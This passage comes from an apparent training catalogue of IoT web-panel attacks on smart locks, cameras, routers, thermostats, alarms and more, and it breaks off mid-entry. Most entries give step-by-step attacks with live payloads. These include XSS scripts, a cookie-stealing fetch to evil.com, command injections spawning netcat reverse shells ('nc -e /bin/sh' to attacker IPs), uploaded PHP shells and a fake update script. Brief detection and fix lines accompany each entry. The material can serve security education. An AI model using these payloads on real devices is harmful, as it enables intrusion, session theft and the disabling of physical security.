- **Attack Steps**: Step 1: Access the endpoint /graphql via GraphQL Playground.Step 2: Submit a mutation like:mutation { createDevice(input: [{id:"1",name:"mal1"},{id:"2",name:"mal2"}]) }Step 3: Observe the creation of multiple unauthorized devices.Step 4: No API key or auth token was required for the mutation.Step 5: Simulate database poisoning by filling the device list with fake entries.Step 6: Use the fake devices to trigger dashboards or alert systems.
- **Detection**: Audit mutations; flag unauthenticated object creation
- **Solution**: Authenticate and rate-limit all mutation calls
- **Tags**: graphql, mutation abuse, data injection

## Remote Configuration Injection via API Reflection

- **Attack Type**: Config Override
- **Target**: Smart Plug / Thermostat
- **Vulnerability**: Blind reflection of config input from API to device
- **MITRE**: T1565.001 (Stored Command)
- **Impact**: Unauthorized reconfiguration of devices
- **Tools**: Postman, Burp Suite, Mobile App
- **Scenario**: API reflects user-submitted JSON back to the device for application, allowing configuration override.
- **Attack Steps**: Step 1: Identify API used for configuration like /api/device/configure.Step 2: Submit JSON like { "wifi": { "ssid": "attacker", "password": "12345678" } }.Step 3: Observe that the cloud API reflects and applies the values directly to the device.Step 4: No input validation or role-based access checks are performed.Step 5: Use this to simulate unauthorized configuration of device network or thresholds.Step 6: Teach students how blind trust in API input can be catastrophic.
- **Detection**: Detect config pushes from non-owner accounts
- **Solution**: Validate configs server-side, restrict fields, log changes
- **Tags**: config injection, device takeover, reflection

## Smart Camera Panel XSS via Comment Box

- **Attack Type**: XSS
- **Target**: Smart Camera
- **Vulnerability**: Reflected XSS
- **MITRE**: T1059.007
- **Impact**: Interface defacement, session hijack
- **Tools**: Burp Suite, Web browser
- **Scenario**: A smart IP camera allows users to leave comments via a web interface. The input is not sanitized.
- **Attack Steps**: Step 1: Connect the camera to the local network and access its admin portal using its IP address (e.g., 192.168.0.101).Step 2: Login using default credentials (admin/admin).Step 3: Navigate to the “Feedback” or “Comment” section.Step 4: In the input box, instead of regular text, enter: <script>alert('XSS Test');</script>.Step 5: Submit the comment.Step 6: Reload the page to observe a popup, indicating XSS is successful.Step 7: Replace alert() with malicious JavaScript to steal cookies or perform session hijacking.
- **Detection**: Content Security Policy (CSP) logs, browser warnings
- **Solution**: Apply input sanitization & output encoding
- **Tags**: XSS, IP Camera, Web GUI

## Home Router Remote Code Execution via Ping Tool

- **Attack Type**: RCE
- **Target**: Home Router
- **Vulnerability**: Command Injection in Ping field
- **MITRE**: T1059.004
- **Impact**: Full device compromise
- **Tools**: Netcat, curl, Burp Suite
- **Scenario**: The router web panel has a ping diagnostic tool that doesn't validate user input properly.
- **Attack Steps**: Step 1: Access the router’s web interface (e.g., 192.168.0.1).Step 2: Login with default or guessed credentials.Step 3: Navigate to “Diagnostics > Ping”.Step 4: In the ping input, instead of typing 8.8.8.8, enter 8.8.8.8; nc -lvp 4444 -e /bin/sh.Step 5: On the attacker’s system, run nc -lvnp 4444 to listen for a reverse shell.Step 6: Submit the form. The device executes the injected command, providing shell access.Step 7: Explore the file system or exfiltrate data.
- **Detection**: IDS or unusual process creation logs
- **Solution**: Sanitize shell inputs & restrict to IPs only
- **Tags**: RCE, Router, Diagnostics

## Thermostat Panel Persistent XSS via Device Name Field

- **Attack Type**: XSS
- **Target**: Smart Thermostat
- **Vulnerability**: Stored XSS
- **MITRE**: T1059.007
- **Impact**: User data compromise, reputational loss
- **Tools**: Browser DevTools, Burp Suite
- **Scenario**: A smart thermostat allows renaming the device. The field is vulnerable to persistent XSS.
- **Attack Steps**: Step 1: Access the thermostat’s IP (e.g., 192.168.1.50).Step 2: Login to the panel with admin credentials.Step 3: Go to “Settings > Device Name”.Step 4: Change the name to <script>document.write('Hacked');</script>.Step 5: Save the settings.Step 6: Navigate to the dashboard—every user will see “Hacked” written, confirming persistent XSS.Step 7: Replace script with data exfiltration logic (e.g., cookie theft).
- **Detection**: JavaScript monitoring tools
- **Solution**: Escape special characters in HTML
- **Tags**: IoT XSS, Thermostat

## Web Admin Panel RCE via File Upload Function

- **Attack Type**: RCE
- **Target**: NAS Device
- **Vulnerability**: Unrestricted File Upload
- **MITRE**: T1190
- **Impact**: Remote shell access
- **Tools**: PHP reverse shell, Burp Suite, netcat
- **Scenario**: A media storage device allows uploading of media files but doesn’t validate file type.
- **Attack Steps**: Step 1: Access the admin portal at the device IP (e.g., 192.168.0.150).Step 2: Authenticate using admin credentials.Step 3: Go to “Upload > Media File”.Step 4: Instead of a video or image, upload a PHP reverse shell (shell.php).Step 5: Monitor the upload directory (often uploads/) and access the uploaded file via browser.Step 6: On attacker machine, run nc -lvnp 4444.Step 7: On executing http://device-ip/uploads/shell.php, the attacker gains shell access.Step 8: Navigate the system, extract credentials or sensitive files.
- **Detection**: File monitoring, extension logging
- **Solution**: Allow only whitelisted file extensions
- **Tags**: RCE, File Upload, NAS

## Smart Light Controller XSS in Scheduler Interface

- **Attack Type**: XSS
- **Target**: Smart Lighting Panel
- **Vulnerability**: DOM-Based XSS
- **MITRE**: T1059.007
- **Impact**: UI manipulation, session hijack
- **Tools**: Browser, Burp Suite
- **Scenario**: A smart light controller allows setting schedule names. The input is not sanitized, leading to XSS.
- **Attack Steps**: Step 1: Open the web panel (e.g., 192.168.0.120).Step 2: Go to “Scheduler” tab.Step 3: Click “Add New Schedule”.Step 4: In “Schedule Name”, insert <img src=x onerror=alert('XSS')>.Step 5: Save the schedule.Step 6: When schedules load, the alert will trigger.Step 7: Modify the script to extract user session data or tokens.
- **Detection**: Browser console and UI behavior
- **Solution**: Input validation & CSP headers
- **Tags**: Smart Light, DOM XSS

## Exploiting Smart Door Lock Settings via XSS

- **Attack Type**: XSS
- **Target**: Smart Door Lock
- **Vulnerability**: Stored XSS
- **MITRE**: T1059.007
- **Impact**: Credential theft, lock manipulation
- **Tools**: Burp Suite, Firefox DevTools
- **Scenario**: Smart door lock lets admins update user-friendly device name. The input isn't sanitized and causes persistent XSS.
- **Attack Steps**: Step 1: Access the web interface of the smart lock at 192.168.1.10.Step 2: Login using default creds admin:admin123.Step 3: Navigate to “Device Settings > Name”.Step 4: Insert the payload: <script>alert('DoorLock XSS');</script>.Step 5: Save settings. The script is now stored.Step 6: Navigate back to dashboard or refresh.Step 7: Script auto-executes whenever anyone visits the dashboard.Step 8: Replace alert() with script to send cookies to attacker server.
- **Detection**: Monitor JavaScript behavior, audit logs
- **Solution**: Input sanitization, CSP
- **Tags**: IoT XSS, Home Automation

## Web Admin Panel RCE via SSH Diagnostics Injection

- **Attack Type**: RCE
- **Target**: Smart Switch
- **Vulnerability**: Command Injection
- **MITRE**: T1059.004
- **Impact**: Full system access
- **Tools**: curl, Burp Suite, netcat
- **Scenario**: A smart switch's web panel allows SSH diagnostic inputs that are passed directly to a shell.
- **Attack Steps**: Step 1: Access the device at 192.168.0.111.Step 2: Login to admin panel.Step 3: Go to “Diagnostics > SSH Test”.Step 4: Enter: ;nc -e /bin/sh 192.168.0.105 5555.Step 5: Run listener on attacker device using nc -lvnp 5555.Step 6: When test is submitted, device runs the command.Step 7: Attacker gains shell access to the smart switch.
- **Detection**: Unusual outbound traffic detection
- **Solution**: Validate diagnostic input, disable shell access
- **Tags**: Smart Switch, RCE

## XSS in WiFi Name Setting of IoT Repeater

- **Attack Type**: XSS
- **Target**: WiFi Repeater
- **Vulnerability**: Stored XSS
- **MITRE**: T1059.007
- **Impact**: Session hijack, JS injection
- **Tools**: Firefox DevTools, Wireshark
- **Scenario**: A repeater allows changing SSID via web UI, but doesn't escape HTML tags.
- **Attack Steps**: Step 1: Connect to the repeater and access 192.168.1.2.Step 2: Login using admin:password.Step 3: Navigate to "WiFi Settings > SSID".Step 4: Enter <script>alert("WiFiXSS")</script> as the SSID.Step 5: Save settings and reload the main dashboard.Step 6: Alert pops up indicating XSS.Step 7: Payload can be replaced to run malicious JS remotely.
- **Detection**: Browser console alerts
- **Solution**: Escape user input fields
- **Tags**: Repeater, Web UI XSS

## Remote Shell via Debug Console in Web UI

- **Attack Type**: RCE
- **Target**: IoT Dev Board
- **Vulnerability**: Web Debug Console RCE
- **MITRE**: T1059.004
- **Impact**: Root shell access
- **Tools**: netcat, Burp Suite, Python HTTP server
- **Scenario**: IoT developer board exposes a hidden web debug console that executes code entered in a form.
- **Attack Steps**: Step 1: Connect to device web interface at 192.168.100.1/debug.Step 2: Enter test command ls and see if output is returned.Step 3: Try ;nc -e /bin/sh 192.168.0.104 9999 to test RCE.Step 4: Start listener on attacker system: nc -lvnp 9999.Step 5: Submit form and observe reverse shell connection.Step 6: If successful, access root shell and exfiltrate /etc/passwd.Step 7: Use for privilege escalation testing.
- **Detection**: Debug port logs, network monitor
- **Solution**: Disable debug UI in production builds
- **Tags**: Developer Console, RCE

## IoT Baby Monitor - XSS via Alert Settings

- **Attack Type**: XSS
- **Target**: Baby Monitor
- **Vulnerability**: Persistent XSS
- **MITRE**: T1059.007
- **Impact**: Sensitive data leak
- **Tools**: Burp Suite, Chrome
- **Scenario**: Baby monitor web UI lets user set alert descriptions without input validation.
- **Attack Steps**: Step 1: Connect to web panel via 192.168.0.60.Step 2: Login to admin dashboard.Step 3: Go to "Alerts > Add New Alert".Step 4: Enter this in the alert description: <img src=x onerror=alert('XSS')>.Step 5: Save the alert.Step 6: Go back to alert history.Step 7: Script executes in browser context.Step 8: Payload can steal session cookies or deface UI.
- **Detection**: JavaScript DOM scanner
- **Solution**: Sanitize alert descriptions
- **Tags**: Baby Monitor, IoT, XSS

## Exploiting Smart Plug through Web Panel CMD Injection

- **Attack Type**: RCE
- **Target**: Smart Plug
- **Vulnerability**: RCE via Time Injection
- **MITRE**: T1059.004
- **Impact**: Remote control of power devices
- **Tools**: Burp Suite, netcat, ping
- **Scenario**: Web panel allows command-based power scheduling but doesn't sanitize shell input.
- **Attack Steps**: Step 1: Access the device at 192.168.0.130.Step 2: Login as admin.Step 3: Go to “Advanced > Power Schedule”.Step 4: In the time field, input 12:00; nc -e /bin/sh 192.168.0.102 6666.Step 5: Start netcat listener on attacker system: nc -lvnp 6666.Step 6: Schedule executes and spawns reverse shell.Step 7: Attacker can control power settings remotely.
- **Detection**: Unusual process exec logs
- **Solution**: Validate time field inputs
- **Tags**: Smart Plug, RCE

## RCE via Firmware Upgrade Panel

- **Attack Type**: RCE
- **Target**: IoT Gateway
- **Vulnerability**: Malicious Firmware Upload
- **MITRE**: T1203
- **Impact**: Persistent access, lateral movement
- **Tools**: Fake firmware with PHP payload, netcat, curl
- **Scenario**: Firmware update panel allows uploading zip files but does not check file content type.
- **Attack Steps**: Step 1: Zip a file containing backdoor.php.Step 2: Access the firmware update portal.Step 3: Upload the zip file.Step 4: On attacker machine, prepare listener on port 7777: nc -lvnp 7777.Step 5: Navigate to /uploads/backdoor.php in browser.Step 6: Reverse shell spawns.Step 7: Escalate privileges or move laterally in network.
- **Detection**: Monitor uploaded content hashes
- **Solution**: Verify file contents + digital signing
- **Tags**: Firmware RCE, IoT Gateway

## Command Injection in Smart Fridge Inventory Module

- **Attack Type**: RCE
- **Target**: Smart Fridge
- **Vulnerability**: Cron Injection RCE
- **MITRE**: T1053.003
- **Impact**: Full control of scheduling feature
- **Tools**: Burp Suite, bash, netcat
- **Scenario**: Inventory panel allows setting cron jobs for refills, vulnerable to shell injection.
- **Attack Steps**: Step 1: Access smart fridge via 192.168.2.2.Step 2: Login to admin.Step 3: Go to “Inventory > Scheduler”.Step 4: Add a cron expression: * * * * * nc -e /bin/sh 192.168.0.105 8888.Step 5: Run listener: nc -lvnp 8888.Step 6: Wait for cron to execute and get remote shell.Step 7: Access internal logs, user food data.
- **Detection**: Monitor unexpected cron entries
- **Solution**: Sanitize and restrict cron syntax
- **Tags**: Fridge, Scheduler, RCE

## XSS in IoT Weather Station Comment Section

- **Attack Type**: XSS
- **Target**: Weather Station
- **Vulnerability**: Persistent XSS
- **MITRE**: T1059.007
- **Impact**: Credential theft, UI abuse
- **Tools**: Firefox DevTools
- **Scenario**: Public weather portal on the IoT station allows leaving feedback on readings.
- **Attack Steps**: Step 1: Connect to the weather station’s web portal (e.g., 192.168.1.250).Step 2: Scroll to the comment or “feedback” section.Step 3: Post comment as <script>fetch('http://evil.com?c='+document.cookie)</script>.Step 4: Reload page or have other users view it.Step 5: Victims' cookies are exfiltrated.Step 6: Replay stolen session tokens for impersonation.
- **Detection**: CSP, suspicious URL logs
- **Solution**: Content escaping and field restriction
- **Tags**: IoT Station, XSS

## XSS via Dynamic Status Banner in Web UI

- **Attack Type**: XSS
- **Target**: Smart Irrigation
- **Vulnerability**: DOM-Based XSS
- **MITRE**: T1059.007
- **Impact**: Browser compromise, phishing
- **Tools**: Burp Suite, Chrome DevTools
- **Scenario**: IoT irrigation controller has a status banner field that renders unsanitized input.
- **Attack Steps**: Step 1: Access irrigation controller’s web UI.Step 2: Go to “Status > Custom Message”.Step 3: Inject <svg/onload=alert('XSS-irrigation')>.Step 4: Save and refresh dashboard.Step 5: Script runs instantly.Step 6: Replace payload with keylogger or phishing redirect.
- **Detection**: Script monitoring, WAF
- **Solution**: Strip scriptable attributes
- **Tags**: Irrigation, Banner, DOM XSS

## RCE via Web-Based Wi-Fi Scanner Panel

- **Attack Type**: RCE
- **Target**: Smart Hub
- **Vulnerability**: Command Injection via Shell
- **MITRE**: T1059.004
- **Impact**: Remote control of device
- **Tools**: Burp Suite, Netcat, Ping
- **Scenario**: A web-based Wi-Fi scanner built into a smart home hub allows users to "ping" nearby networks. User input is passed to a shell without sanitization.
- **Attack Steps**: Step 1: Access the smart hub panel at 192.168.0.1.Step 2: Login using admin credentials.Step 3: Go to “Network > Wi-Fi Scanner”.Step 4: In the SSID search field, enter ; nc -e /bin/sh 192.168.0.105 9999.Step 5: Start listener on attacker system: nc -lvnp 9999.Step 6: Click "Scan", triggering backend command execution.Step 7: Reverse shell is received on attacker system.Step 8: Attacker can now manipulate device configurations.
- **Detection**: Alert on suspicious scanning logs
- **Solution**: Validate and escape all user inputs
- **Tags**: Wi-Fi Scanner, Smart Hub

## Smart Sprinkler XSS via Location Field

- **Attack Type**: XSS
- **Target**: Smart Sprinkler
- **Vulnerability**: Stored XSS
- **MITRE**: T1059.007
- **Impact**: User session hijack
- **Tools**: Firefox DevTools, Burp Suite
- **Scenario**: Smart irrigation system allows the user to name zones and locations. The input is rendered without sanitization.
- **Attack Steps**: Step 1: Access the sprinkler panel via 192.168.2.20.Step 2: Login using admin account.Step 3: Go to "Zone Configuration".Step 4: Change the “Location” field to: <script>alert('Irrigation XSS')</script>.Step 5: Save and return to dashboard.Step 6: Script auto-executes whenever dashboard is loaded.Step 7: Replace alert with malicious script to extract cookies.
- **Detection**: CSP headers, user-agent alerts
- **Solution**: Input sanitization, disable HTML rendering
- **Tags**: Irrigation, Zone XSS

## File Upload RCE in IP Camera Web Interface

- **Attack Type**: RCE
- **Target**: IP Camera
- **Vulnerability**: Arbitrary File Upload
- **MITRE**: T1190
- **Impact**: Video tampering, remote shell
- **Tools**: PHP reverse shell, Burp Suite, Netcat
- **Scenario**: The camera’s media upload panel does not restrict executable files.
- **Attack Steps**: Step 1: Create a PHP shell and name it cam.php.Step 2: Access the camera at 192.168.1.80 and login.Step 3: Go to “Media > Upload”.Step 4: Upload cam.php, bypassing extension check via Burp (Content-Type: image/jpeg).Step 5: Access the uploaded file via http://192.168.1.80/uploads/cam.php.Step 6: Run listener on port 5555: nc -lvnp 5555.Step 7: Trigger the PHP file, gaining shell access.Step 8: Explore filesystem and alter video feed.
- **Detection**: File signature mismatch alerts
- **Solution**: Validate MIME types and file signatures
- **Tags**: Camera Upload, RCE

## XSS in Smart Mirror Custom Widget

- **Attack Type**: XSS
- **Target**: Smart Mirror
- **Vulnerability**: DOM-based XSS
- **MITRE**: T1059.007
- **Impact**: Visual defacement, phishing
- **Tools**: DevTools, Burp, HTML Snippet
- **Scenario**: Smart mirror displays widgets like news/weather via HTML. User customization isn't sanitized.
- **Attack Steps**: Step 1: Access web panel at 192.168.0.200.Step 2: Go to "Widgets > Add Custom".Step 3: Enter <iframe src="javascript:alert('XSS Mirror')"></iframe>.Step 4: Save and refresh mirror display.Step 5: The alert pops up showing successful script execution.Step 6: Replace script to inject rogue iframes or redirect to malicious sites.
- **Detection**: Unexpected iframe logs, CSP
- **Solution**: Escape user inputs in HTML views
- **Tags**: Mirror UI, DOM Injection

## Smart TV Control RCE via Debug Endpoint

- **Attack Type**: RCE
- **Target**: Smart TV
- **Vulnerability**: Unprotected Debug Endpoint
- **MITRE**: T1210
- **Impact**: Full system compromise
- **Tools**: cURL, Netcat
- **Scenario**: Debug API endpoint exposed on smart TV interface allows direct shell commands from input field.
- **Attack Steps**: Step 1: Access smart TV interface at 192.168.1.90/debug.Step 2: Use Postman or Burp to send: POST /debug/run with body: {"cmd":"nc -e /bin/sh 192.168.0.110 7070"}.Step 3: Open Netcat listener on port 7070: nc -lvnp 7070.Step 4: Send request.Step 5: Reverse shell opens.Step 6: Attacker can dump credentials, screen record, etc.
- **Detection**: Debug logs, API traffic inspection
- **Solution**: Disable debug API in production
- **Tags**: Smart TV, RCE

## Web Panel Injection in Smart Alarm System

- **Attack Type**: RCE
- **Target**: Smart Alarm
- **Vulnerability**: Shell Injection
- **MITRE**: T1059.004
- **Impact**: Disable physical security
- **Tools**: Burp Suite, Netcat
- **Scenario**: Alarm panel allows "Test Siren" feature that executes shell command using user-input volume.
- **Attack Steps**: Step 1: Access alarm web panel at 192.168.1.120.Step 2: Go to “Settings > Test Siren”.Step 3: Input: 10; nc -e /bin/sh 192.168.0.108 9999 into volume field.Step 4: Open Netcat listener on port 9999.Step 5: Click “Test”.Step 6: Attacker gets root shell.Step 7: From shell, disable siren, tamper logs, etc.
- **Detection**: Audio logs, unauthorized commands
- **Solution**: Sanitize volume input field
- **Tags**: Alarm System, Shell Injection

## Hidden iFrame Injection in Smart Billboard

- **Attack Type**: XSS
- **Target**: IoT Billboard
- **Vulnerability**: HTML Injection
- **MITRE**: T1059.007
- **Impact**: Ad defacement, phishing
- **Tools**: Chrome DevTools, Burp
- **Scenario**: Billboard control panel displays ads via web interface. Ad name field accepts JavaScript inside iframe.
- **Attack Steps**: Step 1: Access web panel for billboard controller.Step 2: Add new ad with name: <iframe src="javascript:alert('XSS')">.Step 3: Submit.Step 4: Watch live billboard feed; alert pops up.Step 5: Replace iframe source with phishing domain.
- **Detection**: Unexpected iframe in output
- **Solution**: Filter dangerous tags in text inputs
- **Tags**: XSS, iFrame, Digital Signage

## IoT Lock RCE via Web-Based Update Tool

- **Attack Type**: RCE
- **Target**: Smart Lock
- **Vulnerability**: Update Injection
- **MITRE**: T1203
- **Impact**: Unlocking device, firmware corruption
- **Tools**: Burp, Python Web Server
- **Scenario**: Lock panel allows script-based auto updates. Malicious commands embedded in update field are executed.
- **Attack Steps**: Step 1: Access lock web admin panel.Step 2: Go to “System > Auto Update”.Step 3: Enter update URL: http://192.168.0.105/update.sh.Step 4: Serve fake script via Python: echo "nc -e /bin/sh 192.168.0.105 8888" > update.sh.Step 5: Start listener.Step 6: Submit update.Step 7: Shell spawns, attacker takes control.
- **Detection**: Firmware hash check
- **Solution**: Digitally sign & verify update sources
- **Tags**: Smart Lock, AutoUpdate, RCE

## Smart Fan XSS via Web Control Panel

- **Attack Type**: XSS
- **Target**: Smart Fan
- **Vulnerability**: DOM-Based XSS
- **MITRE**: T1059.007
- **Impact**: UI abuse, phishing
- **Tools**: DevTools, Burp
- **Scenario**: Web-based fan control allows changing fan modes with no input filtering.
- **Attack Steps**: Step 1: Access fan panel at 192.168.1.130.Step 2: Navigate to “Modes”.Step 3: Edit Mode name to <svg/onload=alert("FanXSS")>.Step 4: Save.Step 5: Reload dashboard — script executes.Step 6: Replace payload with malicious JS to phish credentials.
- **Detection**: UI scanner, console alerts
- **Solution**: Input sanitization and tag stripping
- **Tags**: Fan, Mode Settings, XSS

## RCE in Smart Vending Machine Web Portal

- **Attack Type**: RCE
- **Target**: Smart Vending Machine
- **Vulnerability**: Command Injection
- **MITRE**: T1059.004
- **Impact**: Financial loss, data tampering
- **Tools**: Burp, Netcat, Python listener
- **Scenario**: Admin portal for vending machine has a test payment feature vulnerable to injection.
- **Attack Steps**: Step 1: Access 192.168.0.160.Step 2: Login to admin panel.Step 3: Go to “Billing > Test Payment”.Step 4: In amount field, input: 100; nc -e /bin/sh 192.168.0.105 7777.Step 5: On attacker PC, run nc -lvnp 7777.Step 6: Submit form; command executed.Step 7: Remote shell received; data and prices manipulated.
- **Detection**: Monitor suspicious payment commands
- **Solution**: Validate numeric fields strictly
- **Tags**: Vending Portal, Payment Injection

## Smart Thermostat RCE via Diagnostic Ping Utility

- **Attack Type**: RCE
- **Target**: Smart Thermostat
- **Vulnerability**: Command Injection
- **MITRE**: T1059.004
- **Impact**: System takeover, data manipulation
- **Tools**: Burp Suite, Netcat
- **Scenario**: The web UI of a smart thermostat provides a ping tool that passes user input directly to the OS shell, allowing command injection.
- **Attack Steps**: Step 1: Access thermostat's web interface at 192.168.1.80.Step 2: Login as admin.Step 3: Go to "Tools > Network Diagnostics > Ping".Step 4: Input: 127.0.0.1; nc -e /bin/sh 192.168.0.105 8888.Step 5: Run nc -lvnp 8888 on attacker system.Step 6: Submit the ping.Step 7: Shell connection opens on attacker system.Step 8: Attacker now has control over thermostat OS.
- **Detection**: Unusual shell activity or unexpected pings
- **Solution**: Whitelist only IPs, sanitize commands
- **Tags**: Thermostat, Ping RCE

## Weather Station Admin Portal - Stored XSS in Forecast Message

- **Attack Type**: XSS
- **Target**: Weather Station
- **Vulnerability**: Stored XSS
- **MITRE**: T1059.007
- **Impact**: Phishing, UI hijack
- **Tools**: Firefox DevTools, Burp Suite
- **Scenario**: The IoT weather station allows admins to update a "forecast message" shown on the main screen. No input validation is done.
- **Attack Steps**: Step 1: Connect to weather station web panel at 192.168.2.30.Step 2: Login with admin credentials.Step 3: Go to “Display > Forecast Message”.Step 4: Enter: <script>alert('WeatherXSS')</script>.Step 5: Save and view dashboard.Step 6: Alert box appears every time the message is loaded.Step 7: Replace script with phishing script or session hijack code.
- **Detection**: CSP headers, DOM inspection
- **Solution**: Sanitize output, limit to text only
- **Tags**: XSS, Forecast Message

## Smart Garage Controller Web App RCE

- **Attack Type**: RCE
- **Target**: Smart Garage
- **Vulnerability**: Web Shell Injection
- **MITRE**: T1059.004
- **Impact**: Unauthorized entry or shutdown
- **Tools**: Burp Suite, Netcat
- **Scenario**: The admin web panel for a smart garage door has a "Remote Test Command" button used for maintenance; input is directly passed to bash.
- **Attack Steps**: Step 1: Login to smart garage panel at 192.168.1.91.Step 2: Go to “Maintenance > Remote Test Command”.Step 3: Enter: reboot; nc -e /bin/sh 192.168.0.104 9999.Step 4: Listen on attacker's machine using nc -lvnp 9999.Step 5: Submit the test command.Step 6: Shell opens giving attacker full access.Step 7: Modify auto-open schedules or lock logic.
- **Detection**: Execution of unknown processes
- **Solution**: Strict command validation
- **Tags**: Garage RCE, Web Command

## Smart Light Hub - DOM-Based XSS via Custom Theme Loader

- **Attack Type**: XSS
- **Target**: Smart Light Hub
- **Vulnerability**: DOM-Based XSS
- **MITRE**: T1059.007
- **Impact**: Credential theft, phishing
- **Tools**: Chrome DevTools, Burp
- **Scenario**: Smart light web app allows users to load custom themes from URLs. Malicious JavaScript in URL parameter leads to DOM XSS.
- **Attack Steps**: Step 1: Access smart lighting panel at 192.168.1.55.Step 2: Navigate to “Themes > Load from URL”.Step 3: Input: javascript:alert('LightXSS').Step 4: Save theme and apply.Step 5: Alert triggers instantly.Step 6: Replace with actual JavaScript keylogger or redirect.
- **Detection**: Monitor usage of eval() or URL params
- **Solution**: Reject javascript: in URLs
- **Tags**: Lighting, Custom Theme XSS

## XSS in IP Intercom Panel Announcement Field

- **Attack Type**: XSS
- **Target**: IP Intercom
- **Vulnerability**: Persistent XSS
- **MITRE**: T1059.007
- **Impact**: Hijack communication panel
- **Tools**: Firefox DevTools
- **Scenario**: An IP-based intercom lets admins broadcast short announcements through the web UI, which is vulnerable to script injection.
- **Attack Steps**: Step 1: Access web panel at 192.168.1.123.Step 2: Login and go to “Admin > Announcements”.Step 3: Add announcement: <script>alert("IntercomXSS")</script>.Step 4: Save and view intercom dashboard.Step 5: Alert triggers, confirming vulnerability.Step 6: Replace with malicious redirect or session data exfiltration code.
- **Detection**: DOM monitor, CSP logs
- **Solution**: Filter and encode input
- **Tags**: Intercom, Broadcast Panel XSS

## Exploiting Web UI RCE in Industrial IoT Sensor Gateway

- **Attack Type**: RCE
- **Target**: IIoT Gateway
- **Vulnerability**: Hidden Command Execution API
- **MITRE**: T1210
- **Impact**: Industrial sabotage, data loss
- **Tools**: curl, Netcat
- **Scenario**: A sensor gateway exposes a legacy endpoint (/admin/cmd) that allows arbitrary shell execution via POST requests.
- **Attack Steps**: Step 1: Access the sensor gateway API.Step 2: Send POST to /admin/cmd with {"cmd":"nc -e /bin/sh 192.168.0.105 4444"}.Step 3: On attacker machine, run nc -lvnp 4444.Step 4: Payload gets executed, shell is opened.Step 5: Attacker navigates config files, disables sensors.
- **Detection**: Outbound traffic spikes, unknown requests
- **Solution**: Disable legacy APIs, implement access control
- **Tags**: IIoT RCE, API Exploit

## XSS via Device Name in Multi-Room Audio System

- **Attack Type**: XSS
- **Target**: Smart Audio System
- **Vulnerability**: Stored XSS
- **MITRE**: T1059.007
- **Impact**: Credential theft, UI hijack
- **Tools**: Chrome DevTools, Burp
- **Scenario**: Audio system lets each speaker have a name. These names are displayed without escaping in group views.
- **Attack Steps**: Step 1: Connect to audio system web interface.Step 2: Go to “Devices > Rename Speaker”.Step 3: Enter: <script>alert("AudioXSS")</script>.Step 4: Save and go to group view.Step 5: Alert shows automatically.Step 6: Replace with JS-based backdoor or cookie grabber.
- **Detection**: JavaScript monitoring
- **Solution**: Encode outputs, limit allowed characters
- **Tags**: Audio System, Speaker Naming

## RCE via Smart Blinds HTTP Control Interface

- **Attack Type**: RCE
- **Target**: Smart Blinds
- **Vulnerability**: RCE via File Config Upload
- **MITRE**: T1203
- **Impact**: Take control of movement patterns
- **Tools**: Python script, Netcat
- **Scenario**: Blinds use an HTTP endpoint to run automation scripts from uploaded config files. No content inspection allows arbitrary shell commands.
- **Attack Steps**: Step 1: Create malicious config file with shell command inside (e.g., nc -e /bin/sh 192.168.0.105 3131).Step 2: Upload via “Automation > Import Config”.Step 3: On attacker's machine, run nc -lvnp 3131.Step 4: When blinds read config, shell executes.Step 5: Attacker gains full shell to system.
- **Detection**: Monitor imported file contents
- **Solution**: Content signature validation
- **Tags**: Blinds Automation, Config RCE

## Command Injection in IoT Air Quality Monitor

- **Attack Type**: RCE
- **Target**: Smart Air Monitor
- **Vulnerability**: Command Injection
- **MITRE**: T1059.004
- **Impact**: Remote code execution, data spoofing
- **Tools**: Burp Suite, Netcat
- **Scenario**: The web interface accepts threshold values and runs shell scripts on alerts. Injection is possible via user-defined thresholds.
- **Attack Steps**: Step 1: Access device at 192.168.1.77.Step 2: Go to “Threshold Settings > Add Threshold”.Step 3: Set value to: 100; nc -e /bin/sh 192.168.0.105 4343.Step 4: On attacker machine, run nc -lvnp 4343.Step 5: Save and wait for reading to hit threshold.Step 6: Reverse shell opens.Step 7: Attacker controls device remotely.
- **Detection**: Anomaly detection on alerts
- **Solution**: Input field validation, whitelisting
- **Tags**: Air Quality IoT, Threshold Injection

## Smart Energy Meter - XSS via Billing Note Field

- **Attack Type**: XSS
- **Target**: Smart Energy Meter
- **Vulnerability**: Stored XSS
- **MITRE**: T1059.007
- **Impact**: Unauthorized access, financial fraud
- **Tools**: Firefox DevTools
- **Scenario**: Energy meter admin UI allows editing billing notes. JavaScript is not filtered before rendering.
- **Attack Steps**: Step 1: Access admin interface at 192.168.1.150.Step 2: Go to “Billing > Notes”.Step 3: Edit the note to <script>alert("EnergyXSS")</script>.Step 4: Save and reload summary.Step 5: Script executes automatically.Step 6: Replace with session stealer script or phishing content.
- **Detection**: DOM monitoring
- **Solution**: HTML escape output
- **Tags**: Energy Meter, Billing XSS

## Smart Doorbell - XSS via Video Caption Field

- **Attack Type**: XSS
- **Target**: Smart Doorbell
- **Vulnerability**: Stored XSS
- **MITRE**: T1059.007
- **Impact**: Interface hijack, user impersonation
- **Tools**: Chrome DevTools, Burp Suite
- **Scenario**: The doorbell allows adding captions to saved visitor videos. The caption field is vulnerable to stored XSS.
- **Attack Steps**: Step 1: Access the doorbell panel at 192.168.1.40.Step 2: Login with admin credentials.Step 3: Go to “Recordings > Edit Caption”.Step 4: Insert: <script>alert("DoorbellXSS")</script>.Step 5: Save and revisit the recordings tab.Step 6: Alert executes automatically.Step 7: Replace script with keylogger or data exfiltrator.
- **Detection**: DOM event monitor, web logs
- **Solution**: Sanitize stored captions
- **Tags**: Doorbell, Caption XSS

## Smart Lock Hub - RCE via Hidden Shell Form

- **Attack Type**: RCE
- **Target**: Smart Lock Hub
- **Vulnerability**: Web Shell Injection
- **MITRE**: T1059.004
- **Impact**: Physical security bypass
- **Tools**: Burp Suite, Netcat
- **Scenario**: A hidden form in the lock management UI directly pipes input into a system shell.
- **Attack Steps**: Step 1: Discover hidden URL /admin/shell.html via code inspection or directory brute-force.Step 2: Open the form and input: nc -e /bin/sh 192.168.0.105 5555.Step 3: Start listener: nc -lvnp 5555.Step 4: Submit the form.Step 5: Reverse shell spawns with root access.Step 6: Lock/unlock remotely or dump logs.
- **Detection**: Access to hidden web components
- **Solution**: Disable unused shell endpoints
- **Tags**: Smart Lock RCE, Hidden UI

## Baby Monitor Web Panel - Reflected XSS in Search Bar

- **Attack Type**: XSS
- **Target**: Baby Monitor
- **Vulnerability**: Reflected XSS
- **MITRE**: T1059.007
- **Impact**: Session token theft
- **Tools**: Burp Suite, Firefox DevTools
- **Scenario**: The admin portal search bar reflects user input without sanitization.
